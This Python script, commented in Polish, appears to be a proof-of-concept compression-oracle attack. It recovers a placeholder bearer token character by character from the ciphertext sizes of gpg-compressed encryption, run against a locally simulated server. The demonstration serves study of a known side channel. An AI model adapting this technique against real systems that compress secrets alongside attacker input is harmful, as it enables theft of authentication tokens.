import subprocess

CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789"

# symulacja działania serwera

def encrypt_size(injected_prefix):
    plaintext = (
        f"Daily Build\n"
        f"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.SECRET_TOKEN_ABCDEF\n"
        f"{injected_prefix}\n"
    )
    proc = subprocess.run(
        ["gpg", "--symmetric", "--cipher-algo", "AES256",
         "--compress-algo", "ZIP", "--allow-old-cipher-algos",
         "--batch", "--passphrase", "haslo1234", "--output", "-"],
        input=plaintext.encode(), capture_output=True
    )
    return len(proc.stdout)

# atak oracle

size = encrypt_size("")
base_line_size = size
print(f"Rozmiar ciphertextu bez wstrzyknięcia: {base_line_size}B")

guessed = ""
position = 0
while True:
    results = {c: encrypt_size(f"eyJhbGciOiJIUzI1NiJ9.{guessed}{c}") for c in CHARS}
    best_char = min(results, key=results.get)
    guessed += best_char
    size = results[best_char]
    position += 1

    if size > base_line_size + 2:
        break

    print(f"\tPozycja {position}: '{best_char}' ({size}B) | zgadnięto: '{guessed}'")